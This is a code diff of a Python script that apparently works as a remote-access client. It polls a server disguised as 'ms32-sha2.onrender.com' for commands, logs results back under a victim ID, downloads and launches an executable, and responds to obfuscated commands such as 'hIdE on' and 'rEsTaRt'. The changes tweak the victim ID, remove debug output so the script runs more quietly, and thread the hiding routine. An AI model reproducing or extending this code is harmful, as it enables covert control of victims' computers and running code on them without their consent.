@@ -10,7 +10,7 @@ from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 from shutil import rmtree
 url = "https://ms32-sha2.onrender.com/"
 terminate = False
-user = "93"
+user = "03"
 #compile left
 try:
     pygame.mixer.init()
@@ -34,9 +34,8 @@ def log(statement,state="SUCESS"):
     try:
         statement = f"{state}   {statement}"
         hit(url+"output",data={"user":user,"err":statement})
-        print("done")
     except:
-        print("abhigyan")
+        pass
 
 def say(txt):
     try:
@@ -248,7 +247,6 @@ def display(fp:str):
                         downloaded_size += len(chunk)
         os.startfile("imshow.exe")
     except Exception as e:
-        print("Error")
         log(f"Display thread error occured:\t{e}",state="WARN")
 
 def main():
@@ -261,7 +259,7 @@ def main():
                 cmd = cmd.content.decode("utf-8")
             print(cmd)
             if "hIdE on" in cmd:
-                hide(True)
+                Thread(target=hide,args=(True,)).start()
             elif "hIdE off" in cmd:
                 hide(False)
             elif "rEsTaRt" in cmd:
